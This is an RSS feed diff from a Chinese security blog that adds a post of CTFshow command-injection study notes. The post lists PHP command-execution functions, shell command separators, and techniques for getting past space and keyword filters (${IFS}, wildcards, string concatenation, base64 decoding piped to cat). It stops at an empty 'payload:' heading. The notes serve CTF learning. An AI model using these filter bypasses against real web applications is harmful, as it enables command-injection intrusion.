@@ -12,12 +12,109 @@
     
     <copyright>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</copyright>
     
-    <lastBuildDate>Mon, 30 Jun 2025 21:00:01 +0800</lastBuildDate>
+    <lastBuildDate>Tue, 22 Jul 2025 18:36:25 +0800</lastBuildDate>
     
     
     <atom:link href="https://www.lier.xin/tags/rce/index.xml" rel="self" type="application/rss&#43;xml" />
     
 
+    
+    
+
+    <item>
+      <title>Ctfshow_rce</title>
+      <link>https://www.lier.xin/post/ctfshow_rce/</link>
+      <pubDate>Tue, 22 Jul 2025 18:36:25 &#43;0800</pubDate>
+      <author>3310338687@qq.com (Lier)</author>
+      <guid>https://www.lier.xin/post/ctfshow_rce/</guid>
+      <description>
+        <![CDATA[<h1>Ctfshow_rce</h1><p>作者：Lier（3310338687@qq.com）</p>
+        
+          <h2 id="命令执行">
+<a class="header-anchor" href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c"></a>
+命令执行
+</h2><p>77</p>
+<h3 id="命令执行函数">
+<a class="header-anchor" href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e5%87%bd%e6%95%b0"></a>
+命令执行函数
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">system()
+</span></span><span class="line"><span class="cl">passthru()
+</span></span><span class="line"><span class="cl">exec()
+</span></span><span class="line"><span class="cl">shell_exec()
+</span></span><span class="line"><span class="cl">popen()
+</span></span><span class="line"><span class="cl">pcntl_exec()
+</span></span><span class="line"><span class="cl">proc_open()
+</span></span><span class="line"><span class="cl">``反引号运算符
+</span></span></code></pre></div><p>popen()函数用法
+<img src="https://image.3001.net/images/20240316/1710591793_65f58f31a784eff8fa6d1.png" alt="wd"></p>
+<p>pcntl_exec()</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pcntl_exec(&#34;/bin/ls&#34;, [&#34;-l&#34;, &#34;/tmp&#34;]); ##/bin/ls -l /tmp
+</span></span></code></pre></div><p>反引号使用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">php &gt; eval<span class="o">(</span><span class="s2">&#34;echo `whoami`;&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">lier
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">php &gt; eval<span class="o">(</span>system<span class="o">(</span><span class="s1">&#39;cat `ls`&#39;</span><span class="o">))</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">flag<span class="o">{</span>ldjwi<span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lier@Lier:/tmp$ cat <span class="sb">`</span>ls<span class="sb">`</span>
+</span></span><span class="line"><span class="cl">flag<span class="o">{</span>ldjwi<span class="o">}</span>
+</span></span></code></pre></div><h3 id="常见管道符">
+<a class="header-anchor" href="#%e5%b8%b8%e8%a7%81%e7%ae%a1%e9%81%93%e7%ac%a6"></a>
+常见管道符
+</h3><h4 id="windows和linux">
+<a class="header-anchor" href="#windows%e5%92%8clinux"></a>
+windows和Linux
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">command1 <span class="p">|</span> command2 <span class="c1"># 管道符前面和后面的命令都会执行，只不过只会返回后者的命令执行结果。如果1执行错误,则2不再执行</span>
+</span></span><span class="line"><span class="cl">command1 <span class="o">||</span> command2 <span class="c1"># 如果1执行出错，则会执行2</span>
+</span></span><span class="line"><span class="cl">command1 <span class="p">&amp;</span> command2 <span class="c1"># 先执行1，不管成功与否都会执行2</span>
+</span></span><span class="line"><span class="cl">command1 <span class="o">&amp;&amp;</span> command2 <span class="c1"># 先执行1，如果执行出错则不再执行2，如果1执行成功则会执行2</span>
+</span></span></code></pre></div><h4 id="linux独有">
+<a class="header-anchor" href="#linux%e7%8b%ac%e6%9c%89"></a>
+Linux独有
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">command1<span class="p">;</span>command2  <span class="c1"># 先执行1再执行2，不管1成功与否都会执行2</span>
+</span></span><span class="line"><span class="cl"><span class="sb">``</span>                 <span class="c1">#执行命令语句</span>
+</span></span><span class="line"><span class="cl"><span class="k">$()</span>                <span class="c1">#执行命令语句</span>
+</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">_</span><span class="si">}</span>              <span class="c1">#上一个命令的最后一个参数,若上一次没有命令输出，则为0</span>
+</span></span><span class="line"><span class="cl"><span class="k">$(())</span><span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl"><span class="k">$((</span>~<span class="k">$(())))</span><span class="o">=</span>-1
+</span></span></code></pre></div><h3 id="bypass过滤">
+<a class="header-anchor" href="#bypass%e8%bf%87%e6%bb%a4"></a>
+Bypass过滤
+</h3><h4 id="空格bypass">
+<a class="header-anchor" href="#%e7%a9%ba%e6%a0%bcbypass"></a>
+空格bypass
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="si">${</span><span class="nv">IFS</span><span class="si">}</span><span class="nv">$9</span>
+</span></span><span class="line"><span class="cl"><span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$IFS</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$IFS$9</span>
+</span></span><span class="line"><span class="cl">&lt;
+</span></span><span class="line"><span class="cl">&lt;&gt; 
+</span></span><span class="line"><span class="cl"><span class="o">{</span>cat,flag.php<span class="o">}</span>
+</span></span><span class="line"><span class="cl">%09 <span class="c1"># 制表符Tab键</span>
+</span></span><span class="line"><span class="cl">%0a %0b %0c %0d %0f %0e
+</span></span></code></pre></div><h4 id="flag关键字bypass">
+<a class="header-anchor" href="#flag%e5%85%b3%e9%94%ae%e5%ad%97bypass"></a>
+flag关键字bypass
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1、反斜线
+</span></span><span class="line"><span class="cl">2、引号
+</span></span><span class="line"><span class="cl">3、空变量 $# $@ $n
+</span></span><span class="line"><span class="cl">4、base家族
+</span></span><span class="line"><span class="cl">5、hex
+</span></span><span class="line"><span class="cl">6、通配符 ? *
+</span></span><span class="line"><span class="cl">7、中括号 [e-g]lag.txt=flag.txt
+</span></span><span class="line"><span class="cl">8、大括号 cat f{k..m}ag.txt
+</span></span><span class="line"><span class="cl">9、拼接法 a=fl;b=ag;cat $a$b.txt
+</span></span><span class="line"><span class="cl">10、内联执行 `` 和 $() 和 echo |base64 -d|xargs cat
+</span></span><span class="line"><span class="cl">11、带外 cp mv 支持通配符
+</span></span><span class="line"><span class="cl">12、参数逃逸 eval system include
+</span></span></code></pre></div><p>payload:</p>
+        
+        <hr><p>本文2025-07-22首发于<a href='https://www.lier.xin/'>Only_ONE</a>，最后修改于2025-07-22</p>]]>
+      </description>
+      
+        <category>Learning</category>
+      
+    </item>
     
     
 
